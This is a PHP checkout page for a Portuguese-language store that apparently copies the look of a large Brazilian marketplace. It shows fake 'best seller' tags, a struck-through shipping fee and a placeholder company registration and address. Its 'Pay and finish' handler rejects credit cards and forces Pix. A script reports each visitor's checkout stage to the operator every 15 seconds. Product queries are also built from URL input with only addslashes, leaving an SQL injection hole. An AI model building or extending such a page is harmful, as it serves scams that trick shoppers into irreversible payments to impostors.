<?php 
session_start();
require_once("api/db.php");
require_once("api/facebook_pixel.php");

if (!isset($_GET["produto"])) {
    session_destroy();
    header("Location: ./index");
    exit();
} else {
    $id = addslashes($_GET["produto"]);
    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
    if(($sqlx ? mysqli_num_rows($sqlx) : 0) > 0){
        $sql = mysqli_query($conn, "SELECT * from config");
        $nome = "Minha Loja";
        $cor = "#ffe600";
        $cor_botao = "#3483fa";
        $endereco = "";
        $cnpj = "";
        while($sql && $row = mysqli_fetch_array($sql)){ 
            $cor = $row["cor"];
            $cor_botao = isset($row["cor_botao"]) ? $row["cor_botao"] : "#3483fa";
            $nome = $row["nome"];
            $endereco = isset($row["endereco"]) ? $row["endereco"] : "";
            $cnpj = isset($row["cnpj"]) ? $row["cnpj"] : "";
        }
        $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
        while($sql1 && $row1 = mysqli_fetch_array($sql1)){ 
            $codigo = $row1["codigo"];
            $nomeproduto = $row1["nome"];
            $valor = $row1["valor"];
            $img = $row1["img"];
        }
        $_SESSION['session_payment'] = time() + 1000;
        $logo_files = glob("arquivos/logo/*.png");
        $logo_loja = !empty($logo_files) ? $logo_files[0] : "";
    } else {
        session_destroy();
        header("Location: ./index");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pagamento - <?php echo htmlspecialchars($nome); ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --store-yellow: <?php echo $cor; ?>;
            --store-blue: <?php echo $cor_botao; ?>;
            --store-bg-gray: #ebebeb;
            --store-text-dark: #333;
            --store-green: #00a650;
            --card-border: #ededed;
        }
        body { font-family: "Proxima Nova",-apple-system,Roboto,Arial,sans-serif; background-color: var(--store-bg-gray); color: var(--store-text-dark); -webkit-font-smoothing: antialiased; overflow-x: hidden; }
        
        .header-simple { background-color: var(--store-yellow); padding: 8px 16px; position: sticky; top: 0; z-index: 100; display: flex; justify-content: center; }
        .header-logo-full { height: 40px; object-fit: contain; }

        .checkout-wrap { max-width: 1000px; margin: 0 auto; padding: 30px 15px; }
        .page-title { font-size: 24px; font-weight: 600; margin-bottom: 24px; color: #333; }

        .checkout-grid { display: grid; grid-template-columns: 1fr 340px; gap: 30px; align-items: start; }

        /* CARDS */
        .checkout-card { background: #fff; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); padding: 24px; margin-bottom: 16px; }
        .card-title { font-size: 18px; font-weight: 600; color: #333; margin-bottom: 20px; }
        .card-header-flex { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 20px; }
        .link-blue { color: var(--store-blue); text-decoration: none; font-size: 14px; font-weight: 500; }
        .link-blue:hover { text-decoration: underline; }

        /* PRODUCT INFO */
        .product-header { display: flex; gap: 15px; margin-bottom: 24px; }
        .product-header img { width: 64px; height: 64px; object-fit: contain; border: 1px solid #eee; border-radius: 4px; padding: 4px; background: #fff; }
        .product-info { flex: 1; }
        .tag-mais-vendido { background: #ff7733; color: #fff; font-size: 10px; font-weight: 700; padding: 2px 6px; border-radius: 3px; display: inline-block; margin-bottom: 6px; letter-spacing: 0.5px; }
        .product-info h2 { font-size: 15px; font-weight: 400; color: #333; line-height: 1.3; margin-bottom: 4px; }
        .product-variant { font-size: 13px; color: #666; margin-bottom: 4px; }
        .garantia-tag { font-size: 12px; color: #999; display: flex; align-items: center; gap: 5px; }

        /* DELIVERY SECTION */
        .delivery-tabs { display: flex; border: 1px solid var(--card-border); border-radius: 20px; overflow: hidden; margin-bottom: 20px; width: fit-content; background: #f5f5f5; }
        .delivery-tab { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 8px 32px; font-size: 14px; font-weight: 600; cursor: pointer; color: #333; }
        .delivery-tab.active { background: #fff; border: 1px solid var(--store-blue); border-radius: 20px; color: var(--store-blue); box-shadow: 0 0 0 1px var(--store-blue); margin: -1px; position: relative; z-index: 1; }
        .delivery-tab.disabled { color: #999; cursor: not-allowed; }
        .tab-free { font-size: 12px; color: var(--store-green); font-weight: 500; }
        .delivery-tab.disabled .tab-free { color: #999; }

        .address-box { display: flex; gap: 12px; border: 1px solid var(--store-blue); border-radius: 6px; padding: 16px; margin-bottom: 24px; }
        .address-box i { color: var(--store-blue); font-size: 18px; margin-top: 2px; }
        .address-details p { font-size: 14px; color: #333; margin-bottom: 6px; line-height: 1.4; font-weight: 500; }

        .envio-full-tag { font-size: 13px; color: var(--store-green); font-style: italic; font-weight: 800; margin-bottom: 12px; display: flex; align-items: center; gap: 4px; }
        .envio-full-tag em { font-style: italic; }

        /* RADIOS */
        .radio-label { display: flex; gap: 12px; padding: 12px 0; cursor: pointer; align-items: flex-start; }
        .radio-label.disabled { cursor: not-allowed; opacity: 0.6; }
        .radio-wrap { position: relative; width: 18px; height: 18px; flex-shrink: 0; margin-top: 2px; }
        .radio-wrap input { opacity: 0; width: 0; height: 0; position: absolute; }
        .radio-custom { position: absolute; top: 0; left: 0; width: 18px; height: 18px; border: 2px solid #ccc; border-radius: 50%; transition: 0.2s; }
        .radio-wrap input:checked ~ .radio-custom { border-color: var(--store-blue); border-width: 5px; }
        
        .radio-text { flex: 1; display: flex; flex-direction: column; gap: 2px; }
        .envio-date { font-size: 14px; color: #333; }
        .envio-link { font-size: 13px; color: var(--store-blue); margin-top: 2px; }
        .radio-price { text-align: right; display: flex; flex-direction: column; font-size: 13px; }
        .scratched { text-decoration: line-through; color: #999; font-size: 12px; }
        .free { color: var(--store-green); font-weight: 500; }

        /* PAYMENTS */
        .payment-methods { display: flex; flex-direction: column; }
        .method-label { padding: 16px 0; border-bottom: 1px solid #eee; align-items: center; }
        .method-label:last-child { border-bottom: none; padding-bottom: 0; }
        .method-icon-wrap { margin-right: 4px; }
        .icon-circle { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; }
        .pix-circle { border: 1px solid #32bcad; color: #32bcad; }
        .cartao-circle { background: #f0f0f0; color: #666; }
        .method-title { font-size: 15px; color: #333; font-weight: 500; }
        .method-desc { font-size: 13px; color: #999; margin-top: 4px; }

        /* FATURAMENTO */
        .faturamento-text { font-size: 14px; color: #333; }

        /* RIGHT SIDEBAR */
        .summary-card { background: #fff; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); padding: 24px; position: sticky; top: 80px; }
        .summary-title { font-size: 18px; font-weight: 600; color: #333; margin-bottom: 20px; }
        .summary-line { display: flex; justify-content: space-between; font-size: 14px; color: #333; margin-bottom: 16px; align-items: center; }
        .highlight-green { color: var(--store-green); }
        .frete-right { display: flex; flex-direction: column; align-items: flex-end; }
        .cupom-link { margin-bottom: 24px; display: inline-block; font-size: 14px; }
        
        .total-line-small { margin-bottom: 8px; font-size: 14px; }
        .pagara-right { display: flex; align-items: baseline; gap: 4px; }
        .pix-label { font-size: 12px; color: #999; }
        
        .total-line-big { margin-top: 16px; padding-top: 16px; border-top: 1px solid #eee; font-size: 18px; font-weight: 600; margin-bottom: 8px; }
        .total-savings { display: flex; flex-direction: column; align-items: flex-end; font-size: 12px; color: var(--store-green); margin-bottom: 24px; font-weight: 500; }
        
        .btn-finish { display: block; width: 100%; height: 48px; background: var(--store-blue); color: #fff; border-radius: 6px; font-weight: 600; font-size: 16px; border: none; cursor: pointer; transition: 0.2s; }
        .btn-finish:hover { filter: brightness(0.9); }
        .btn-finish:disabled { opacity: 0.7; cursor: not-allowed; }

        /* MOBILE FLOATING BAR */
        .mobile-floating-bar {
            display: none;
            position: fixed;
            bottom: 0; left: 0; right: 0;
            background: #fff;
            border-top: 1px solid #e0e0e0;
            padding: 12px 16px;
            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
            z-index: 999;
            font-family: "Proxima Nova", -apple-system, "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif;
        }
        .mfb-cupom {
            display: flex; align-items: center; gap: 8px;
            color: #3483fa; font-size: 14px; font-weight: 500;
            padding-bottom: 12px; border-bottom: 1px solid #eee; margin-bottom: 12px;
        }
        .mfb-content {
            display: flex; justify-content: space-between; align-items: center;
        }
        .mfb-price-col { display: flex; flex-direction: column; }
        .mfb-scratched { font-size: 12px; color: #999; text-decoration: line-through; }
        .mfb-price-main { font-size: 22px; font-weight: 600; color: #333; display: flex; align-items: center; gap: 4px; margin: 2px 0; }
        .mfb-price-main i { font-size: 14px; color: #3483fa; font-weight: 400;}
        .mfb-frete { font-size: 13px; color: #00a650; }
        .mfb-btn {
            background: #3483fa; color: #fff; font-weight: 600; font-size: 16px;
            border: none; border-radius: 6px; padding: 0 24px; height: 48px;
            cursor: pointer; flex: 1; margin-left: 20px; transition: 0.2s;
        }
        .mfb-btn:active { filter: brightness(0.9); }

        /* MOBILE */
        @media (max-width: 900px) {
            .checkout-grid { grid-template-columns: 1fr; gap: 20px; }
            .checkout-wrap { padding: 15px; padding-bottom: 150px; }
            .summary-card { position: static; }
            .mobile-floating-bar { display: block; }
            #desktop-finish-btn { display: none; }
        }
        @media (max-width: 480px) {
            .checkout-card, .summary-card { padding: 16px; }
            .page-title { font-size: 20px; }
        }
        
        /* Rodapé Padronizado */
        .footer-main { background-color: #f5f5f5; border-top: 1px solid #e0e0e0; padding: 40px 20px 30px; margin-top: 60px; font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif; }
        .footer-content { max-width: 1200px; margin: 0 auto; text-align: center; }
        .footer-links-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; margin-bottom: 25px; }
        .footer-link { font-size: 13px; color: #666; text-decoration: none; }
        .footer-link:hover { color: #3483fa; }
        .footer-copyright { font-size: 13px; color: #666; margin-bottom: 8px; }
        .footer-info { font-size: 12px; color: #999; }
    </style>
    <?php echo fb_pixel_base_code(); ?>
    <link rel="shortcut icon" href="arquivos/favicon.png?v=<?php echo time(); ?>">
    <link rel="icon" type="image/png" href="arquivos/favicon.png?v=<?php echo time(); ?>">
</head>
<body>
    <header class="header-simple" style="justify-content: flex-start; padding-left: 20px;">
        <a href="confirm_address.php?produto=<?php echo $codigo; ?>" style="color: #333; font-size: 20px; text-decoration: none; margin-right: 15px; display: flex; align-items: center;"><i class="fa-solid fa-arrow-left"></i></a>
        <span style="font-weight: 600; font-size: 18px; color: #333; display: flex; align-items: center;">Finalize sua compra</span>
    </header>

    <main class="checkout-wrap">
        <div class="checkout-grid">
            <!-- COLUNA ESQUERDA -->
            <div class="checkout-left">
                
                <!-- PRODUTO -->
                <div class="product-header">
                    <?php $img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img"; ?>
                    <img src="<?php echo $img_src; ?>" alt="Produto">
                    <div class="product-info">
                        <span class="tag-mais-vendido">MAIS VENDIDO</span>
                        <h2><?php echo htmlspecialchars($nomeproduto); ?></h2>
                        <p class="product-variant" id="dyn-variant">Carregando detalhes...</p>
                        <p class="garantia-tag"><i class="fa-solid fa-shield-halved"></i> Garantia estendida</p>
                    </div>
                </div>

                <!-- ENTREGA -->
                <div class="checkout-card">
                    <h3 class="card-title">Forma de entrega</h3>
                    <div class="delivery-tabs">
                        <div class="delivery-tab active" id="tab-frete" onclick="selectDelivery('frete')">
                            <span class="tab-title">Frete</span>
                            <span class="tab-free">Grátis</span>
                        </div>
                        <div class="delivery-tab" id="tab-retirada" onclick="selectDelivery('retirada')">
                            <span class="tab-title">Retirada</span>
                            <span class="tab-free">Grátis</span>
                        </div>
                    </div>

                    <div class="address-box">
                        <i class="fa-solid fa-location-dot"></i>
                        <div class="address-details">
                            <p id="dyn-address">Rua..., Número - CEP ...</p>
                            <a href="confirm_address.php?produto=<?php echo $codigo; ?>" class="link-blue">Alterar endereço</a>
                        </div>
                    </div>

                    <div class="shipping-method">
                        <h4 class="envio-full-tag">Envio <i class="fa-solid fa-bolt"></i> <em>FULL</em></h4>
                        
                        <label class="radio-label" id="label-frete" onclick="selectDelivery('frete')">
                            <div class="radio-wrap">
                                <input type="radio" name="envio" id="radio-frete" checked>
                                <span class="radio-custom"></span>
                            </div>
                            <div class="radio-text">
                                <span class="envio-date"><span id="dyn-date">Chegará até segunda-feira</span> <span class="free" style="margin-left: 4px;">Grátis</span></span>
                            </div>
                        </label>

                        <label class="radio-label" id="label-retirada" onclick="selectDelivery('retirada')">
                            <div class="radio-wrap">
                                <input type="radio" name="envio" id="radio-retirada">
                                <span class="radio-custom"></span>
                            </div>
                            <div class="radio-text">
                                <span class="envio-date" style="color: #666;">No dia que você preferir</span>
                                <span class="envio-link">Conferir dias disponíveis</span>
                            </div>
                        </label>
                    </div>
                </div>

                <!-- PAGAMENTO -->
                <div class="checkout-card">
                    <div class="card-header-flex">
                        <h3 class="card-title" style="margin: 0;">Meios de pagamento</h3>
                    </div>

                    <div class="payment-methods">
                        <label class="radio-label method-label" onclick="selectMethod('pix')">
                            <div class="radio-wrap">
                                <input type="radio" name="payment" value="pix" checked id="radio-pix">
                                <span class="radio-custom"></span>
                            </div>
                            <div class="method-icon-wrap">
                                <div class="icon-circle pix-circle"><i class="fa-brands fa-pix"></i></div>
                            </div>
                            <div class="radio-text">
                                <span class="method-title">Pix</span>
                                <span class="method-desc"><i class="fa-regular fa-clock" style="margin-right: 4px;"></i>Ao finalizar, daremos instruções para pagar.</span>
                            </div>
                        </label>

                        <label class="radio-label method-label" onclick="selectMethod('cartao')">
                            <div class="radio-wrap">
                                <input type="radio" name="payment" value="cartao" id="radio-cartao">
                                <span class="radio-custom"></span>
                            </div>
                            <div class="method-icon-wrap">
                                <div class="icon-circle cartao-circle"><i class="fa-solid fa-credit-card"></i></div>
                            </div>
                            <div class="radio-text">
                                <span class="method-title">Cartão de Crédito</span>
                                <span class="method-desc">Pague em até 12x sem juros.</span>
                            </div>
                        </label>
                    </div>
                </div>

                <!-- FATURAMENTO -->
                <div class="checkout-card">
                    <h3 class="card-title" style="margin-bottom: 12px;">Faturamento</h3>
                    <p class="faturamento-text" id="dyn-faturamento">Nome - CPF ...</p>
                    <a href="confirm_address.php?produto=<?php echo $codigo; ?>" class="link-blue" style="margin-top: 10px; display: inline-block;">Alterar</a>
                </div>

            </div>

            <!-- COLUNA DIREITA (SIDEBAR) -->
            <div class="checkout-right">
                <div class="summary-card">
                    <h3 class="summary-title">Resumo da compra</h3>
                    
                    <div class="summary-line">
                        <span>Produto</span>
                        <span id="sum-prod">R$ 0,00</span>
                    </div>
                    
                    <div class="summary-line highlight-green">
                        <span>Desconto do produto</span>
                        <span id="sum-discount">- R$ 0,00</span>
                    </div>
                    
                    <div class="summary-line">
                        <span>Frete</span>
                        <div class="frete-right">
                            <span class="scratched">R$ 49,90</span>
                            <span class="free">Grátis</span>
                        </div>
                    </div>

                    <a href="#" class="link-blue cupom-link"><i class="fa-solid fa-ticket" style="margin-right: 5px;"></i> Inserir código do cupom</a>

                    <div class="summary-line total-line-small">
                        <span>Você pagará</span>
                        <div class="pagara-right">
                            <span id="sum-pagara">R$ 0,00</span>
                            <span class="pix-label">Pix</span>
                        </div>
                    </div>

                    <div class="summary-line total-line-big">
                        <span>Total</span>
                        <div class="total-right">
                            <span id="sum-total">R$ 0,00</span>
                        </div>
                    </div>
                    <div class="total-savings">
                        <span id="sum-economizou">Você economizou R$ 0,00</span>
                        <span>Frete grátis</span>
                    </div>

                    <button id="desktop-finish-btn" class="btn-finish" onclick="finish()">Pagar e finalizar</button>
                </div>
            </div>
        </div>
    </main>

    <footer class="footer-main">
      <div class="footer-content">
        <div class="footer-links-container">
            <a href="politica-de-privacidade" class="footer-link">Política de Privacidade</a>
            <a href="termos-de-uso" class="footer-link">Termos de Uso</a>
            <a href="trocas-e-devolucoes" class="footer-link">Trocas e Devoluções</a>
        </div>
        <p class="footer-copyright">Copyright © <?php echo date('Y'); ?> <?php echo htmlspecialchars($nome); ?>. Todos os direitos reservados.</p>
        <p class="footer-info">CNPJ: <?php echo !empty($cnpj) ? htmlspecialchars($cnpj) : "00.000.000/0001-00"; ?> | Endereço: <?php echo !empty($endereco) ? htmlspecialchars($endereco) : "Av. Paulista, 1000 - São Paulo, SP"; ?></p>
      </div>
    </footer>

    <!-- MOBILE FLOATING BAR -->
    <div class="mobile-floating-bar">
        <div class="mfb-cupom">
            <i class="fa-solid fa-ticket"></i> Inserir código do cupom
        </div>
        <div class="mfb-content">
            <div class="mfb-price-col">
                <span class="mfb-scratched" id="mfb-scratched">R$ 0,00</span>
                <span class="mfb-price-main"><span id="mfb-total">R$ 0,00</span> <span style="font-size: 14px; color: #3483fa;">&#9652;</span></span>
                <span class="mfb-frete">Frete grátis</span>
            </div>
            <button class="mfb-btn btn-finish" onclick="finish()">Pagar e finalizar</button>
        </div>
    </div>

    <script>
        let selectedMethod = 'pix';

        function selectMethod(method) {
            selectedMethod = method;
            $('#radio-pix').prop('checked', method === 'pix');
            $('#radio-cartao').prop('checked', method === 'cartao');
            $('.pix-label').text(method === 'pix' ? 'Pix' : 'Cartão');
        }

        function finish() {
            if (selectedMethod === 'pix') {
                $('.btn-finish').prop('disabled', true).html('<i class="fa-solid fa-spinner fa-spin"></i> Processando...');
                setTimeout(function(){
                    window.location.href = 'success.php' + window.location.search;
                }, 500);
            } else {
                alert('Por favor, utilize o Pix para aprovação imediata no momento.');
                selectMethod('pix');
            }
        }

        function formatarDataChegada() {
            const dataAtual = new Date();
            const diasAdicionais = 3; 
            dataAtual.setDate(dataAtual.getDate() + diasAdicionais);
            
            const diasSemana = ['domingo', 'segunda-feira', 'terça-feira', 'quarta-feira', 'quinta-feira', 'sexta-feira', 'sábado'];
            const meses = ['janeiro', 'fevereiro', 'março', 'abril', 'maio', 'junho', 'julho', 'agosto', 'setembro', 'outubro', 'novembro', 'dezembro'];
            
            const diaSemanaStr = diasSemana[dataAtual.getDay()];
            const diaMes = dataAtual.getDate();
            const mesStr = meses[dataAtual.getMonth()];
            
            $('#dyn-date').text('Chegará até ' + diaSemanaStr + ' ' + diaMes + ' de ' + mesStr);
        }

        function selectDelivery(type) {
            $('.delivery-tab').removeClass('active');
            if(type === 'frete') {
                $('#tab-frete').addClass('active');
                $('#radio-frete').prop('checked', true);
            } else {
                $('#tab-retirada').addClass('active');
                $('#radio-retirada').prop('checked', true);
            }
        }

        $(document).ready(function(){
            formatarDataChegada();

            // Puxar dados do localStorage
            const cli = JSON.parse(localStorage.getItem('cliente_dados') || '{}');
            
            if(cli.rua) {
                const numStr = cli.numero ? cli.numero : 'S/N';
                let addr = `${cli.rua} ${numStr}`;
                if(cli.complemento) addr += `, ${cli.complemento}`;
                if(cli.cep) addr += ` - CEP ${cli.cep}`;
                $('#dyn-address').text(addr);
            }

            if(cli.nome) {
                let fat = cli.nome;
                if(cli.telefone) {
                    fat += ` - ${cli.telefone}`;
                }
                $('#dyn-faturamento').text(fat);
            }

            // Puxar variações
            const vars = JSON.parse(localStorage.getItem('variacoes_selecionadas') || '{}');
            let varText = [];
            for(let key in vars) {
                varText.push(`${key}: ${vars[key]}`);
            }
            if(varText.length > 0) {
                $('#dyn-variant').text(varText.join(' | '));
            } else {
                $('#dyn-variant').text('Quantidade: 1');
            }

            // Preços
            const cartData = JSON.parse(localStorage.getItem('lojavirtual') || '{}');
            if(cartData.precoFinal) {
                let precoStr = cartData.precoFinal.replace('.', '').replace(',', '.');
                let totalFinal = parseFloat(precoStr) || 0;
                
                let precoOrigStr = cartData.precoOriginal ? cartData.precoOriginal.replace('.', '').replace(',', '.') : precoStr;
                let precoOriginal = parseFloat(precoOrigStr) || totalFinal;

                let desconto = precoOriginal - totalFinal;

                const formataBRL = (valor) => valor.toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});

                $('#sum-prod').text(formataBRL(precoOriginal));
                $('#sum-discount').text('- ' + formataBRL(desconto));
                
                $('#sum-pagara').text(formataBRL(totalFinal));
                $('#sum-total').text(formataBRL(totalFinal));
                
                $('#sum-economizou').text('Você economizou ' + formataBRL(desconto));

                $('#mfb-scratched').text(formataBRL(precoOriginal));
                $('#mfb-total').text(formataBRL(totalFinal));
            }

            sendOnline('payment');
            setInterval(function(){ sendOnline('payment'); }, 15000);
        });

        function sendOnline(etapa) {
            const payload = btoa(unescape(encodeURIComponent(JSON.stringify({
                api: 'online',
                etapa: etapa,
                dispositivo: /Android|iPhone/i.test(navigator.userAgent) ? 'mobile' : 'desktop'
            }))));
            $.post('api/index.php', { p: payload });
        }
    </script>
</body>
</html>


